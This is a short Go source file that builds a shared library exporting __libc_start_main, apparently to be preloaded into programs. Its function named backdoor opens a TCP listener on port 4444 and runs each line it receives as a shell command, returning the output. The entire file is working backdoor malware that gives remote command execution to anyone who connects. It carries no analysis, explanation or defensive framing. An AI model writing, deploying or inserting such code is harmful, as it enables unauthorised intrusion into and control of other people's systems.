package main

import (
	"C"

	"bufio"
	"log"
	"net"
	"net/textproto"
	"os/exec"
)

// main is required to build a shared library, but does nothing
func main() {}

//export __libc_start_main
func __libc_start_main() {
	backdoor()

}

func backdoor() {
	ln, err := net.Listen("tcp", ":4444")
	if err != nil {
		return
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)

	for {
		input, err := tp.ReadLine()
		if err != nil {
			log.Println("Error reading:", err.Error())
			break
		}

		cmd := exec.Command("/usr/bin/env", "sh", "-c", input)
		output, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
		}

		conn.Write(output)
	}

	conn.Close()
}
